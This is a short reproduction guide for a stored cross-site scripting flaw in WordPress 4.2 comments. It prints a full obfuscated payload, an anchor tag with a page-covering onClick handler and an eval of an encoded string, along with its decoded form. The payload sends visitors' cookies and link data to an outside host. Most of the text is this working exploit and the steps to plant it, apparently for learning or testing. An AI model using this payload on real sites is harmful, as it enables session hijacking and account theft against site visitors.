# Introduction on reproducing the Vulnerability.

* Target platform : Wordpress version 4.2. Download [here](https://wordpress.org/download/release-archive/).
* Copy & Paste the script content in xss file
* Insert into the comment area of Wordpress blog
* Observing the code execution : ).

## How does the injected code work ?

The injected code redirects user to attacker's site with window.location using eval(), which is a function that allows user to execute arbitrary code on the fly, along with user's cookies to the attacker's server.

```html
<a title='xxx onClick=eval(unescape(/window.location%3D%27http%3A%2F%2Fmysite.vn%3Fc%3D%27%2Bdocument.links%5B1%5D.text%2B%27%26l%3D%27%2Bdocument.links%5B1%5D%2B%27%26c%3D%27%2Bdocument.cookie/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAA...[64kb]...AAA'></a>
```
unescape() decodes a encoded string. The unescape(string) version of the above code is equivalent to this:
```html
window.location='http://mysite.vn?c='+document.links[1].text+'&l='+document.links[1]+'&c='+document.cookie
```
References:
[WordPress 4.2 Stored XSS](https://klikki.fi/adv/wordpress2.html)
